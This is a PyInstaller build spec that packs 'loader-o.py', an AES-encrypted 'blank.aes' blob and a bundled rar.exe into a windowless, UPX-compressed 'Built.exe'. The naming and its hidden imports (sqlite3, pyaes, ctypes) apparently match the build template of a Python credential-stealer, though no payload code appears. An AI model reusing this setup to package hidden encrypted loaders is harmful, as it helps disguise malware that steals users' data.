# -*- mode: python ; coding: utf-8 -*-


a = Analysis(
    ['loader-o.py'],
    pathex=[],
    binaries=[('rar.exe', '.')],
    datas=[('rarreg.key', '.'), ('blank.aes', '.'), ('bound.blank', '.')],
    hiddenimports=['urllib3', 'sqlite3', 'pyaes', 'ctypes', 'ctypes.wintypes', 'json'],
    hookspath=[],
    hooksconfig={},
    runtime_hooks=[],
    excludes=[],
    noarchive=False,
    optimize=0,
)
pyz = PYZ(a.pure)

exe = EXE(
    pyz,
    a.scripts,
    a.binaries,
    a.datas,
    [],
    name='Built.exe',
    debug=False,
    bootloader_ignore_signals=False,
    strip=False,
    upx=True,
    upx_exclude=[],
    runtime_tmpdir=None,
    console=False,
    disable_windowed_traceback=False,
    argv_emulation=False,
    target_arch=None,
    codesign_identity=None,
    entitlements_file=None,
    version='version.txt',
    icon='NONE',
)
